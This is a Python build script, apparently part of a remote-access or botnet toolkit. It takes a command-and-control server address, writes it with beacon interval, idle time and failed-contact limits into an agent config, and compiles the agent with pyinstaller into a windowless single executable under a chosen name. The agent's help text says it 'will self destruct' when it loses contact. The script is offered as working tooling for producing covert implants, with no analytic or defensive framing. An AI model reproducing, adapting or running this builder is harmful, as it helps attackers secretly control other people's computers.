import os
import tempfile
import shutil
from argparse import ArgumentParser


def initagent(link, interval, idle, max_failed,  output):
    directory = os.path.basename(output)
    working = os.path.join(tempfile.gettempdir(), 'BoBo')
    if os.path.exists(working):
        shutil.rmtree(working)
    agent = os.path.dirname(__file__)
    shutil.copytree(agent, working)
    with open(os.path.join(working, "config.py"), 'w') as config:
        with open(os.path.join(agent, "client_template.py")) as file:
            config_file = file.read()
    config_file = config_file.replace("__SERVER__", link.rstrip('/'))
    config_file = config_file.replace("__HELLO_INTERVAL__", str(interval))
    config_file = config_file.replace("__IDLE_TIME__", str(idle))
    config_file = config_file.replace("__MAX_FAILED_CONNECTIONS__", str(max_failed))
    config.write(config_file)
    cwd = os.getcwd()
    os.chdir(working)
    shutil.move('client.py', directory + '.py')
    os.system('pyinstaller --noconsole --onefile ' + directory + '.py')
    agentFile = os.path.join(working, 'dist', directory)
    os.chdir(cwd)
    os.rename(agentFile, output)
    shutil.rmtree(working)
    print("Build Made")

def main():
    parser = ArgumentParser("Agent Builder.")
    parser.add_argument('--server', required=True, help="Address of the server (e.g http://localhost:12345).")
    parser.add_argument('-o', '--output', required=True, help="Output file name.")
    parser.add_argument('--interval', type=int, default=2,
                        help="Delay (in seconds) between each request to server.")
    parser.add_argument('--idle', type=int, default=60,
                        help="Inactivity time (in seconds) after which to go idle.")
    parser.add_argument('--max-failed', type=int, default=10,
                        help="The agent will self destruct if no contact can be made in given attempts.")
    args = parser.parse_args()

    initagent(

        link=args.server,
        interval=args.interval,
        idle=args.idle,
        max_failed=args.max_failed,
        output=args.output)


if __name__ == "__main__":
    main()

